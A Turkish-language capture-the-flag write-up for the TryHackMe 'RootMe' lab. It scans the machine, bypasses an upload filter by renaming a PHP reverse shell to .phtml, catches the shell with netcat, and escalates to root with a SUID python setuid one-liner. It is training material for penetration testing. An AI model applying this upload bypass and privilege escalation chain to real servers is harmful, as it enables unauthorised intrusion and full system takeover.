# RootMe CTF Write up
---
Selam Dostlar RootMe ctf çözümüyle karsınızdayım.

`nmap -sC -sV <İP> -Pn`

```sh
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-02 03:14 EDT
Nmap scan report for 10.10.214.100
Host is up (0.62s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

##### 80 portunun (http) acik oldugunu goruyoruz hemen siteye gidiyoruz:
---------





/index.php de (ana safada) isimize yarayacak birsey yok bizde gobuster/dirb 
ile dizin taraması yapıyoruz.


`gobuster dir -u http://10.10.214.100 -w /usr/share/dirb/wordlists/common.txt`

```sh
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/panel (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
```



##### Bize Verilen çıktıyı inceliyoruz:
--------
Status:403 olarak belirtilen dizinler erisim yetkimizin `olmadığı` dizinler
Status:301 olarak belirttiği dizinler erisim yetkimizin `oldugu` dizinler

##### Erisim yetkimizin olduğu dizinleri inceliyoruz:
------
```
/css dizininde home dizini ve /panel dizinin css kodları var.
/js dizininde bir js kodu var.
/panel dizininde bizi dosya yükleyebileceğimiz bir sayfa karşılıyor.
/uploads dizini yüklenen dosyaların bulunduğu dizin
```
##### Php reverse shell indirmek ve düzenliyoruz:
----
~Reverse Shelli [buradan](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) indirebilirsiniz.
```
Php reverse shelli açıp tun0 ipimizi ve dinleyeceğimiz portu yazıyoruz.
```
##### php reverse shelli /panel adresine yüklüyoruz:
--------
```
Php reverse shell yüklemeye çalışıyoruz ama hata veriyor.`
Buradan php dosyalarını yüklemeyi kabul etmediğini görüyoruz.`
Bunu bypass etmek için uzatısını phtml olarak degistirip yüklüyoruz.`
```
##### Shelli almaya calışıyoruz:
-----
```
/uploads dizinine yuklenen dosyaların gittigini biliyorduk.
Bizde yukledigimiz dosyanın buraya geldiğini görüyoruz.
nc -lvnp (shelle yazdığımız port) yazarak portumuzu dinlemeye alıyoruz.
/uploads dizinine yüklediğimiz shellin üzerine tıklıyoruz
Ve Bağlantı Geliyor
```
##### User flagı buluyoruz:
------
`Hemen bulunduğumuz dizine ls çekiyoruz ve user flagı okuyoruz:`

```
$ cat user.txt
THM{xxxxxxxxxxxxxxx}
```

##### Yetki Yükseltiyoruz:
---
```
find / -user root -perm /4000 2>/dev/null
```
`komutu ile root olarak kullanbileceğimiz progrmaları listeliyoruz.`
`/usr/bin/python ı görüyoruz ve bunla yetki yükseltmeye çalışıyoruz.`

[GTFOBins](https://gtfobins.github.io/) adresinde pythonu aratıyor ve python yetki yükseltme komutunu buluyoruz:
```
-c 'import os; os.setuid(0); os.system("/bin/sh")'
```
`pythonun bulunduğu dizini belirterek (/usr/bin/python) pythonu çalıştırıyor ve yetki yükseltme komutumuzu yazıyoruz.`

```
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

id yazarak root olduğumuzu görüyoruz:
```
uid=0(root) gid=33(www-data) groups=33(www-data)
```

`/root dizini altında bulunan root.txt dosyasını okuyoruz`

```
# cat /root/root.txt
THM{xxxxxxxxxxxxxxxxxxxx}
```







